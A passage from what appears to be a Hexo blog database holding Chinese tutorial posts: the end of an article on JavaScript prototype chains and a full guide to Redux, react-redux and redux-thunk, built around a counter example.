title=\"原型对象的原型\"></a>原型对象的原型</h4><p>所有的原型应用类型（Object、Array、String）都在其构造函数的原型上定义了方法。在Array.prototype中可以找到sort（）方法；在String.prototype中可以找到substring（）方法，如下：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">Array</span>.prototype.sort); <span class=\"comment\">// ƒ sort() &#123; [native code] &#125;</span></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"built_in\">String</span>.prototype.substring); <span class=\"comment\">// ƒ substring() &#123; [native code] &#125;</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"原型链\"><a href=\"#原型链\" class=\"headerlink\" title=\"原型链\"></a>原型链</h3><p>原型和实例的关系：每个构造函数都有一个原型对象，原型对象都包含一个指向构造函数的指针，而实例都包含一个指向原型对象的内部指针。如果，我们让这个原型对象等于另一个类型的实例，显然，此时的原型对象包含一个指向另一个原型的指针，相应的，另一个原型中野包含着指向另另一个类型的实例，那么，层层递进，就构成了实例与原型的链条，这就是原型链的基本概念。</p>\n<p>我们知道，所有引用类型默认都继承了Object，而这个继承也是通过原型链实现的。所有函数的默认原型都是Object的实例，因此默认原型都包含一个内部指针，指向<code>Object.prototype</code>。这正是所有自定义类型都会继承<code>toString()、valueOf()</code>等默认方式的根本原因。</p>\n<p><img src=\"/view/posts/8814181e/prototype.jpg\" alt=\"原型\"></p>\n"},{"title":"redux","abbrlink":"a8054c2","date":"2020-02-18T09:44:20.000Z","_content":"# redux\n\n作用：集中式管理 react 应用中多个组件共享的状态。\n\n## 核心api\n\n### createStore()\n\n作用：创建包含指定 reducer 的 store 对象\n\n```jsx\nimport {createStore} from 'redux'\nimport reducer from './reducer'\nconst store = createStore(reducer)\n```\n\n### store\n\n作用：redux 库最核心的管理对象\n\n它内部维护着：state 和 reducer\n\n核心方法：`getState()`、`dispatch(action)`、`subscribe(listener)`\n\n编码：\n\n```js\nstore.getState()\nstore.dispatch({type:'INCREMENT', number})\nstore.subscribe(render)\n```\n\n### applyMiddleware()\n\n作用：应用上基于 redux 的中间件(插件库)\n\n编码：\n\n```js\nimport {createStore, applyMiddleware} from 'redux'\nimport thunk from 'redux-thunk' // redux 异步中间件\nconst store = createStore(\n\tcounter,\n    applyMiddleware(thunk) // 应用上异步中间件\n)\n```\n\n### combineReducers()\n\n作用：合并多个 reducer 函数\n\n编码：\n\n```jss\nexport default combineReducers({\n\tuser,\n\tchatUser,\n\tchat\n})\n```\n\n## redux 的三个核心概念\n\n### action\n\n作用：标识要执行行为的对象\n\n包含2个方面的属性\n\n+ type：标识属性, 值为字符串, 唯一, 必要属性\n+ XXX：数据属性，值类型任意，可选属性\n\n例子：\n\n```js\nconst action = {\n    type: 'INCREMENT',\n    data: 2\n}\n```\n\nAction Creator(创建 Action 的工厂函数)\n\n```js\nconst increment = (number) => ({type: 'INCREMENT', data: number})\n```\n\n### reducer\n\n作用：根据老的 state 和 action, 产生新的 state 的纯函数\n\n样例：\n\n```js\nexport default function counter(state = 0, action) {\n  switch (action.type) {\n    case 'INCREMENT':\n      return state + action.data\n    case 'DECREMENT':\n      return state - action.data\n    default:\n      return state\n  }\n}\n```\n\n注意：返回一个新的状态，不要修改原来的状态\n\n### store\n\n将 state,action 与 reducer 联系在一起的对象\n\n```js\nimport {createStore} from 'redux'\nimport reducer from './reducer'\nconst store = createStore(reducer)\n```\n\n此对象的功能：\n\n- getState(): 得到 state\n- dispatch(action): 分发 action, 触发 reducer 调用, 产生新的 state\n- subscribe(listener): 注册监听, 当产生了新的 state 时, 自动调用\n\n## count计数案例\n\n###react实现计数\n\n```jsx\nimport React, { Component } from 'react'\nexport default class App extends Component {\n  state = {\n    count: 0 // 定义变量\n  }\n\n  constructor(props) {\n    super(props)\n    // 创建ref，将其赋值给一个变量，通过ref挂载在dom节点或组件上，该ref的current属性将能拿到dom节点或组件的实例\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => { // 同步加\n    const number = this.numberRef.current.value * 1\n    this.setState(state => ({ count: state.count + number }))\n  }\n\n  decrement = () => { // 同步减\n    const number = this.numberRef.current.value * 1\n    this.setState(state => ({ count: state.count - number }))\n  }\n\n  incrementIfOdd = () => { // 奇数加\n    const number = this.numberRef.current.value * 1\n    if (this.state.count % 2 === 1) {\n      this.setState(state => ({ count: state.count + number }))\n    }\n  }\n\n  incrementAsync = () => { // 异步加\n    const number = this.numberRef.current.value * 1\n    setTimeout(() => {\n      this.setState(state => ({ count: state.count + number }))\n    }, 1000)\n  }\n\n  render() {\n    const count = this.state.count\n    return (\n      <div>\n        <p>click {count} times</p>\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select>{' '}\n          &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>\n          &nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n\n```\n\n## react_redux版本\n\n![react-redux耦合](redux/react-redux%E8%80%A6%E5%90%88.gif)\n\n实现思路：\n\n![react-redux](redux/react-redux.png)\n\n```js\n// index.js\nimport React from 'react'\nimport ReactDOM from 'react-dom'\n\nimport App from './App'\nimport store from './redux/store'\n\nReactDOM.render(<App store={store}/>, document.getElementById('root'))\n\n// 给store绑定状态更新的监听\nstore.subscribe(() => { // store内部的状态数据发生改变时回调\n  // 重新渲染App组件标签\n  ReactDOM.render(<App store={store}/>, document.getElementById('root'))\n})\n```\n\n\n\n```js\n// redux/store.js\n// redux最核心的管理对象: store\nimport {createStore} from 'redux'\nimport reducer from './reducer'\n\nexport default createStore(reducer) // 创建store对象内部会第一次调用reducer()得到初始状态值\n```\n\n\n\n```js\n// redux/reducer.js\n// reducer函数模块: 根据当前state和指定action返回一个新的state\n\nimport { INCREMENT, DECREMENT } from './action-types'\n\n// 管理count状态数据的reducer\nexport default function count(state = 1, action) {\n  console.log('count()', state, action)\n  switch (action.type) {\n    case INCREMENT:\n      return state + action.data\n    case DECREMENT:\n      return state - action.data\n    default:\n      return state\n  }\n}\n```\n\n\n\n```js\n// redux/action-types.js\n// 包含n个action type常量名称的模块\n\nexport const INCREMENT = 'increment'\nexport const DECREMENT = 'decrement'\n```\n\n\n\n```js\n// redux/action.js\n// 包含n个用来创建action的工厂函数(action creator)\n\nimport { INCREMENT, DECREMENT } from './action-types'\n\n/*\n增加的action\n */\nexport const increment = number => ({ type: INCREMENT, data: number })\n/*\n减少的action\n */\nexport const decrement = number => ({ type: DECREMENT, data: number })\n```\n\n\n\n```jsx\n// App.jsx\nimport React, {Component} from 'react'\nimport PropTypes from 'prop-types'\n// 引入 actions，在store.dispatch()触发更新\nimport {increment, decrement} from './redux/actions'\n\nexport default class App extends Component {\n\n  static propTypes = {\n    store: PropTypes.object.isRequired\n  }\n\n\n  constructor(props) {\n    super(props)\n\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.store.dispatch(increment(number))\n  }\n\n  decrement = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.store.dispatch(decrement(number))\n  }\n\n  incrementIfOdd = () => {\n    const number = this.numberRef.current.value * 1\n    if (this.props.store.getState() % 2 === 1) {\n      this.props.store.dispatch(increment(number))\n    }\n\n  }\n\n  incrementAsync = () => {\n    const number = this.numberRef.current.value * 1\n    setTimeout(() => {\n      this.props.store.dispatch(increment(number))\n    }, 1000)\n  }\n\n  render() {\n    const count = this.props.store.getState()\n\n    return (\n      <div>\n        <p>click {count} times</p>\n\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select> &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>&nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n```\n\n\n\n缺点：\n\n1) redux 与 react 组件的代码耦合度太高\n\n2) 编码不够简洁\n\n## react-redux库\n\n一个 react 插件库，专门用来简化 react 应用中使用 redux。\n\nReact-Redux 将所有组件分成两大类：\n\n+  UI 组件\n  a. 只负责 UI 的呈现，不带有任何业务逻辑\n  b. 通过 props 接收数据(一般数据和函数)\n  c. 不使用任何 Redux 的 API\n  d. 一般保存在 components 文件夹下\n+  容器组件\n  a. 负责管理数据和业务逻辑，不负责 UI 的呈现\n  b. 使用 Redux 的 API\n  c. 一般保存在 containers 文件夹下\n\n### 相关api\n\n**Provider**：\n\n```jsx\n// 让所有组件都可以得到 state 数据\n<Provider store={store}>\n\t<App />\n</Provider>\n```\n\n**connect()**：\n\n```js\n// 用于包装 UI 组件生成容器组件\nconnect(\n\tmapStateToprops,\n\tmapDispatchToProps\n)(Counter)\n```\n\n**mapStateToprops()**\n\n```js\n// 函数: 将 state 数据转换为 UI 组件的标签属性\nfunction mapStateToProps (state) {\n    return {\n    \tcount: state\n    }\n}\n```\n\n**mapDispatchToProps**：\n\n```js\n// 函数: 将分发 action 的函数转换为 UI 组件的标签属性\nfunction mapDispatchToProps(dispatch) {\n    return {\n    \tincrement: (number) => dispatch(increment(number)),\n    \tdecrement: (number) => dispatch(decrement(number)),\n    }\n}\n// 对象: 简洁语法, 可以直接指定包含多个 action 方法\nconst mapDispatchToProps = {\n    increment,\n    decrement\n}\n```\n\n\n\n### react-redux版本\n\n```hash\nnpm install --save react-redux\n\nredux/action-types.js 不变\nredux/actions.js 不变\nredux/reducers.js 不变\nredux/store.js 不变\n```\n\n\n\n```JS\n// containers/App.js\nimport {connect} from 'react-redux'\nimport Counter from '../components/Counter'\nimport {increment, decrement} from '../redux/actions'\n\n/*\n// 指定向Counter传入哪些一般属性(属性值的来源就是store中的state)\nconst mapStateToProps = (state) => ({count: state})\n// 指定向Counter传入哪些函数属性\n// 如果是函数, 会自动调用得到对象, 将对象中的方法作为函数属性传入UI组件\nconst mapDispatchToProps = (dispatch) => ({\n  increment: (number) => dispatch(increment(number)),\n  decrement: (number) => dispatch(decrement(number)),\n})\n// 如果是对象, 将对象中的方法包装成一个新函数, 并传入UI组件\n// const mapDispatchToProps = {increment, decrement}\n\nexport default connect(\n  mapStateToProps,\n  mapDispatchToProps\n)(Counter)*/\n\nexport default connect(\n  state => ({count: state}),\n  {increment, decrement},\n)(Counter)\n```\n\n\n\n```jsx\n// components/Counter.jsx\nimport React, {Component} from 'react'\nimport PropTypes from 'prop-types'\n\n/*\nUI组件\n  主要做显示与与用户交互\n  代码中没有任何redux相关的代码\n */\nexport default class Counter extends Component {\n\n  static propTypes = {\n    count: PropTypes.number.isRequired,\n    increment: PropTypes.func.isRequired,\n    decrement: PropTypes.func.isRequired\n  }\n\n  constructor(props) {\n    super(props)\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.increment(number)\n  }\n\n  decrement = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.decrement(number)\n  }\n\n  incrementIfOdd = () => {\n    const number = this.numberRef.current.value * 1\n    if (this.props.count % 2 === 1) {\n      this.props.increment(number)\n    }\n  }\n\n  incrementAsync = () => {\n    const number = this.numberRef.current.value * 1\n    setTimeout(() => {\n      this.props.increment(number)\n    }, 1000)\n  }\n\n  render() {\n    const count = this.props.count\n    return (\n      <div>\n        <p>click {count} times</p>\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select> &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>&nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n```\n\n\n\n```js\n// 入口js\nimport React from 'react'\nimport ReactDOM from 'react-dom'\nimport { Provider } from 'react-redux'\nimport App from './containers/App'\nimport store from './redux/store'\n\nReactDOM.render(<Provider store={store}>\n  <App/>\n</Provider>, document.getElementById('root'))\n```\n\n\n\n## redux-thunk异步中间件\n\n`npm install --save redux-thunk`\n\n```js\n// redux/store.js\nimport {createStore, applyMiddleware} from 'redux'\nimport thunk from 'redux-thunk' // 引入依赖\nimport reducer from './reducer'\n\nexport default createStore(reducer, applyMiddleware(thunk))\n```\n\n\n\n```js\n// redux/actions.js\n/*\n  异步增加的异步 action\n */\nexport const incrementAsync = function(number) {\n  // 返回一个带 dispatch 参数的函数\n  return dispatch => {\n    // 执行异步操作\n    setTimeout(() => {\n      // 有了结果后, 通过同步的increment分发 action\n      dispatch(increment(number))\n    }, 1000)\n  }\n}\n```\n\n\n\n```js\n// components/Counter.jsx\nimport React, {Component} from 'react'\nimport PropTypes from 'prop-types'\n\n/*\nUI组件\n  主要做显示与与用户交互\n  代码中没有任何redux相关的代码\n */\nexport default class Counter extends Component {\n\n  static propTypes = {\n    count: PropTypes.number.isRequired,\n    increment: PropTypes.func.isRequired,\n    decrement: PropTypes.func.isRequired,\n    incrementAsync: PropTypes.func.isRequired // 引入异步方法\n  }\n\n  constructor(props) {\n    super(props)\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.increment(number)\n  }\n\n  decrement = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.decrement(number)\n  }\n\n  incrementIfOdd = () => {\n    const number = this.numberRef.current.value * 1\n    if (this.props.count % 2 === 1) {\n      this.props.increment(number)\n    }\n  }\n\n  incrementAsync = () => {\n    const number = this.numberRef.current.value * 1\n    // 使用 thunk 异步增加\n    this.props.incrementAsync(number)\n  }\n\n  render() {\n    const count = this.props.count\n    return (\n      <div>\n        <p>click {count} times</p>\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select> &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>&nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n```\n\n\n\n```js\n// containers/App.jsx\nimport {connect} from 'react-redux'\nimport Counter from '../components/Counter'\n// 将 incrementAsync 挂载到 Counter\nimport {increment, decrement, incrementAsync} from '../redux/actions'\n\nexport default connect(\n  state => ({count: state}),\n  {increment, decrement, incrementAsync},\n)(Counter)\n```\n\n\n\n## redux 调试工具\n\n在`chrome`安装`redux-devtool`插件\n\n项目中下载依赖：`npm install --save-dev redux-devtools-extension`\n\n```js\n// // redux/store.js\nimport {createStore, applyMiddleware} from 'redux'\n// 引入这个工具\nimport {composeWithDevTools} from 'redux-devtools-extension'\nimport thunk from 'redux-thunk'\nimport reducer from './reducer'\n\nexport default createStore(reducer, composeWithDevTools(applyMiddleware(thunk)))\n```\n\n\n\n\n\n","source":"_posts/redux.md","raw":"---\ntitle: redux\ncategories:\n  - reactjs\ntags:\n  - reactjs\nabbrlink: a8054c2\ndate: 2020-02-18 17:44:20\n---\n# redux\n\n作用：集中式管理 react 应用中多个组件共享的状态。\n\n## 核心api\n\n### createStore()\n\n作用：创建包含指定 reducer 的 store 对象\n\n```jsx\nimport {createStore} from 'redux'\nimport reducer from './reducer'\nconst store = createStore(reducer)\n```\n\n### store\n\n作用：redux 库最核心的管理对象\n\n它内部维护着：state 和 reducer\n\n核心方法：`getState()`、`dispatch(action)`、`subscribe(listener)`\n\n编码：\n\n```js\nstore.getState()\nstore.dispatch({type:'INCREMENT', number})\nstore.subscribe(render)\n```\n\n### applyMiddleware()\n\n作用：应用上基于 redux 的中间件(插件库)\n\n编码：\n\n```js\nimport {createStore, applyMiddleware} from 'redux'\nimport thunk from 'redux-thunk' // redux 异步中间件\nconst store = createStore(\n\tcounter,\n    applyMiddleware(thunk) // 应用上异步中间件\n)\n```\n\n### combineReducers()\n\n作用：合并多个 reducer 函数\n\n编码：\n\n```jss\nexport default combineReducers({\n\tuser,\n\tchatUser,\n\tchat\n})\n```\n\n## redux 的三个核心概念\n\n### action\n\n作用：标识要执行行为的对象\n\n包含2个方面的属性\n\n+ type：标识属性, 值为字符串, 唯一, 必要属性\n+ XXX：数据属性，值类型任意，可选属性\n\n例子：\n\n```js\nconst action = {\n    type: 'INCREMENT',\n    data: 2\n}\n```\n\nAction Creator(创建 Action 的工厂函数)\n\n```js\nconst increment = (number) => ({type: 'INCREMENT', data: number})\n```\n\n### reducer\n\n作用：根据老的 state 和 action, 产生新的 state 的纯函数\n\n样例：\n\n```js\nexport default function counter(state = 0, action) {\n  switch (action.type) {\n    case 'INCREMENT':\n      return state + action.data\n    case 'DECREMENT':\n      return state - action.data\n    default:\n      return state\n  }\n}\n```\n\n注意：返回一个新的状态，不要修改原来的状态\n\n### store\n\n将 state,action 与 reducer 联系在一起的对象\n\n```js\nimport {createStore} from 'redux'\nimport reducer from './reducer'\nconst store = createStore(reducer)\n```\n\n此对象的功能：\n\n- getState(): 得到 state\n- dispatch(action): 分发 action, 触发 reducer 调用, 产生新的 state\n- subscribe(listener): 注册监听, 当产生了新的 state 时, 自动调用\n\n## count计数案例\n\n###react实现计数\n\n```jsx\nimport React, { Component } from 'react'\nexport default class App extends Component {\n  state = {\n    count: 0 // 定义变量\n  }\n\n  constructor(props) {\n    super(props)\n    // 创建ref，将其赋值给一个变量，通过ref挂载在dom节点或组件上，该ref的current属性将能拿到dom节点或组件的实例\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => { // 同步加\n    const number = this.numberRef.current.value * 1\n    this.setState(state => ({ count: state.count + number }))\n  }\n\n  decrement = () => { // 同步减\n    const number = this.numberRef.current.value * 1\n    this.setState(state => ({ count: state.count - number }))\n  }\n\n  incrementIfOdd = () => { // 奇数加\n    const number = this.numberRef.current.value * 1\n    if (this.state.count % 2 === 1) {\n      this.setState(state => ({ count: state.count + number }))\n    }\n  }\n\n  incrementAsync = () => { // 异步加\n    const number = this.numberRef.current.value * 1\n    setTimeout(() => {\n      this.setState(state => ({ count: state.count + number }))\n    }, 1000)\n  }\n\n  render() {\n    const count = this.state.count\n    return (\n      <div>\n        <p>click {count} times</p>\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select>{' '}\n          &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>\n          &nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n\n```\n\n## react_redux版本\n\n![react-redux耦合](redux/react-redux%E8%80%A6%E5%90%88.gif)\n\n实现思路：\n\n![react-redux](redux/react-redux.png)\n\n```js\n// index.js\nimport React from 'react'\nimport ReactDOM from 'react-dom'\n\nimport App from './App'\nimport store from './redux/store'\n\nReactDOM.render(<App store={store}/>, document.getElementById('root'))\n\n// 给store绑定状态更新的监听\nstore.subscribe(() => { // store内部的状态数据发生改变时回调\n  // 重新渲染App组件标签\n  ReactDOM.render(<App store={store}/>, document.getElementById('root'))\n})\n```\n\n\n\n```js\n// redux/store.js\n// redux最核心的管理对象: store\nimport {createStore} from 'redux'\nimport reducer from './reducer'\n\nexport default createStore(reducer) // 创建store对象内部会第一次调用reducer()得到初始状态值\n```\n\n\n\n```js\n// redux/reducer.js\n// reducer函数模块: 根据当前state和指定action返回一个新的state\n\nimport { INCREMENT, DECREMENT } from './action-types'\n\n// 管理count状态数据的reducer\nexport default function count(state = 1, action) {\n  console.log('count()', state, action)\n  switch (action.type) {\n    case INCREMENT:\n      return state + action.data\n    case DECREMENT:\n      return state - action.data\n    default:\n      return state\n  }\n}\n```\n\n\n\n```js\n// redux/action-types.js\n// 包含n个action type常量名称的模块\n\nexport const INCREMENT = 'increment'\nexport const DECREMENT = 'decrement'\n```\n\n\n\n```js\n// redux/action.js\n// 包含n个用来创建action的工厂函数(action creator)\n\nimport { INCREMENT, DECREMENT } from './action-types'\n\n/*\n增加的action\n */\nexport const increment = number => ({ type: INCREMENT, data: number })\n/*\n减少的action\n */\nexport const decrement = number => ({ type: DECREMENT, data: number })\n```\n\n\n\n```jsx\n// App.jsx\nimport React, {Component} from 'react'\nimport PropTypes from 'prop-types'\n// 引入 actions，在store.dispatch()触发更新\nimport {increment, decrement} from './redux/actions'\n\nexport default class App extends Component {\n\n  static propTypes = {\n    store: PropTypes.object.isRequired\n  }\n\n\n  constructor(props) {\n    super(props)\n\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.store.dispatch(increment(number))\n  }\n\n  decrement = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.store.dispatch(decrement(number))\n  }\n\n  incrementIfOdd = () => {\n    const number = this.numberRef.current.value * 1\n    if (this.props.store.getState() % 2 === 1) {\n      this.props.store.dispatch(increment(number))\n    }\n\n  }\n\n  incrementAsync = () => {\n    const number = this.numberRef.current.value * 1\n    setTimeout(() => {\n      this.props.store.dispatch(increment(number))\n    }, 1000)\n  }\n\n  render() {\n    const count = this.props.store.getState()\n\n    return (\n      <div>\n        <p>click {count} times</p>\n\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select> &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>&nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n```\n\n\n\n缺点：\n\n1) redux 与 react 组件的代码耦合度太高\n\n2) 编码不够简洁\n\n## react-redux库\n\n一个 react 插件库，专门用来简化 react 应用中使用 redux。\n\nReact-Redux 将所有组件分成两大类：\n\n+  UI 组件\n  a. 只负责 UI 的呈现，不带有任何业务逻辑\n  b. 通过 props 接收数据(一般数据和函数)\n  c. 不使用任何 Redux 的 API\n  d. 一般保存在 components 文件夹下\n+  容器组件\n  a. 负责管理数据和业务逻辑，不负责 UI 的呈现\n  b. 使用 Redux 的 API\n  c. 一般保存在 containers 文件夹下\n\n### 相关api\n\n**Provider**：\n\n```jsx\n// 让所有组件都可以得到 state 数据\n<Provider store={store}>\n\t<App />\n</Provider>\n```\n\n**connect()**：\n\n```js\n// 用于包装 UI 组件生成容器组件\nconnect(\n\tmapStateToprops,\n\tmapDispatchToProps\n)(Counter)\n```\n\n**mapStateToprops()**\n\n```js\n// 函数: 将 state 数据转换为 UI 组件的标签属性\nfunction mapStateToProps (state) {\n    return {\n    \tcount: state\n    }\n}\n```\n\n**mapDispatchToProps**：\n\n```js\n// 函数: 将分发 action 的函数转换为 UI 组件的标签属性\nfunction mapDispatchToProps(dispatch) {\n    return {\n    \tincrement: (number) => dispatch(increment(number)),\n    \tdecrement: (number) => dispatch(decrement(number)),\n    }\n}\n// 对象: 简洁语法, 可以直接指定包含多个 action 方法\nconst mapDispatchToProps = {\n    increment,\n    decrement\n}\n```\n\n\n\n### react-redux版本\n\n```hash\nnpm install --save react-redux\n\nredux/action-types.js 不变\nredux/actions.js 不变\nredux/reducers.js 不变\nredux/store.js 不变\n```\n\n\n\n```JS\n// containers/App.js\nimport {connect} from 'react-redux'\nimport Counter from '../components/Counter'\nimport {increment, decrement} from '../redux/actions'\n\n/*\n// 指定向Counter传入哪些一般属性(属性值的来源就是store中的state)\nconst mapStateToProps = (state) => ({count: state})\n// 指定向Counter传入哪些函数属性\n// 如果是函数, 会自动调用得到对象, 将对象中的方法作为函数属性传入UI组件\nconst mapDispatchToProps = (dispatch) => ({\n  increment: (number) => dispatch(increment(number)),\n  decrement: (number) => dispatch(decrement(number)),\n})\n// 如果是对象, 将对象中的方法包装成一个新函数, 并传入UI组件\n// const mapDispatchToProps = {increment, decrement}\n\nexport default connect(\n  mapStateToProps,\n  mapDispatchToProps\n)(Counter)*/\n\nexport default connect(\n  state => ({count: state}),\n  {increment, decrement},\n)(Counter)\n```\n\n\n\n```jsx\n// components/Counter.jsx\nimport React, {Component} from 'react'\nimport PropTypes from 'prop-types'\n\n/*\nUI组件\n  主要做显示与与用户交互\n  代码中没有任何redux相关的代码\n */\nexport default class Counter extends Component {\n\n  static propTypes = {\n    count: PropTypes.number.isRequired,\n    increment: PropTypes.func.isRequired,\n    decrement: PropTypes.func.isRequired\n  }\n\n  constructor(props) {\n    super(props)\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.increment(number)\n  }\n\n  decrement = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.decrement(number)\n  }\n\n  incrementIfOdd = () => {\n    const number = this.numberRef.current.value * 1\n    if (this.props.count % 2 === 1) {\n      this.props.increment(number)\n    }\n  }\n\n  incrementAsync = () => {\n    const number = this.numberRef.current.value * 1\n    setTimeout(() => {\n      this.props.increment(number)\n    }, 1000)\n  }\n\n  render() {\n    const count = this.props.count\n    return (\n      <div>\n        <p>click {count} times</p>\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select> &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>&nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n```\n\n\n\n```js\n// 入口js\nimport React from 'react'\nimport ReactDOM from 'react-dom'\nimport { Provider } from 'react-redux'\nimport App from './containers/App'\nimport store from './redux/store'\n\nReactDOM.render(<Provider store={store}>\n  <App/>\n</Provider>, document.getElementById('root'))\n```\n\n\n\n## redux-thunk异步中间件\n\n`npm install --save redux-thunk`\n\n```js\n// redux/store.js\nimport {createStore, applyMiddleware} from 'redux'\nimport thunk from 'redux-thunk' // 引入依赖\nimport reducer from './reducer'\n\nexport default createStore(reducer, applyMiddleware(thunk))\n```\n\n\n\n```js\n// redux/actions.js\n/*\n  异步增加的异步 action\n */\nexport const incrementAsync = function(number) {\n  // 返回一个带 dispatch 参数的函数\n  return dispatch => {\n    // 执行异步操作\n    setTimeout(() => {\n      // 有了结果后, 通过同步的increment分发 action\n      dispatch(increment(number))\n    }, 1000)\n  }\n}\n```\n\n\n\n```js\n// components/Counter.jsx\nimport React, {Component} from 'react'\nimport PropTypes from 'prop-types'\n\n/*\nUI组件\n  主要做显示与与用户交互\n  代码中没有任何redux相关的代码\n */\nexport default class Counter extends Component {\n\n  static propTypes = {\n    count: PropTypes.number.isRequired,\n    increment: PropTypes.func.isRequired,\n    decrement: PropTypes.func.isRequired,\n    incrementAsync: PropTypes.func.isRequired // 引入异步方法\n  }\n\n  constructor(props) {\n    super(props)\n    this.numberRef = React.createRef()\n  }\n\n  increment = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.increment(number)\n  }\n\n  decrement = () => {\n    const number = this.numberRef.current.value * 1\n    this.props.decrement(number)\n  }\n\n  incrementIfOdd = () => {\n    const number = this.numberRef.current.value * 1\n    if (this.props.count % 2 === 1) {\n      this.props.increment(number)\n    }\n  }\n\n  incrementAsync = () => {\n    const number = this.numberRef.current.value * 1\n    // 使用 thunk 异步增加\n    this.props.incrementAsync(number)\n  }\n\n  render() {\n    const count = this.props.count\n    return (\n      <div>\n        <p>click {count} times</p>\n        <div>\n          <select ref={this.numberRef}>\n            <option value=\"1\">1</option>\n            <option value=\"2\">2</option>\n            <option value=\"3\">3</option>\n          </select> &nbsp;&nbsp;\n          <button onClick={this.increment}>+</button>&nbsp;&nbsp;\n          <button onClick={this.decrement}>-</button>&nbsp;&nbsp;\n          <button onClick={this.incrementIfOdd}>increment if odd</button>&nbsp;&nbsp;\n          <button onClick={this.incrementAsync}>increment async</button>\n        </div>\n      </div>\n    )\n  }\n}\n```\n\n\n\n```js\n// containers/App.jsx\nimport {connect} from 'react-redux'\nimport Counter from '../components/Counter'\n// 将 incrementAsync 挂载到 Counter\nimport {increment, decrement, incrementAsync} from '../redux/actions'\n\nexport default connect(\n  state => ({count: state}),\n  {increment, decrement, incrementAsync},\n)(Counter)\n```\n\n\n\n## redux 调试工具\n\n在`chrome`安装`redux-devtool`插件\n\n项目中下载依赖：`npm install --save-dev redux-devtools-extension`\n\n```js\n// // redux/store.js\nimport {createStore, applyMiddleware} from 'redux'\n// 引入这个工具\nimport {composeWithDevTools} from 'redux-devtools-extension'\nimport thunk from 'redux-thunk'\nimport reducer from './reducer'\n\nexport default createStore(reducer, composeWithDevTools(applyMiddleware(thunk)))\n```\n\n\n\n\n\n","slug":"redux","published":1,"updated":"2020-06-18T07:09:21.436Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckclr4u5m000uqrwtgypbanqp","content":"<h1 id=\"redux\"><a href=\"#redux\" class=\"headerlink\" title=\"redux\"></a>redux</h1><p>作用：集中式管理 react 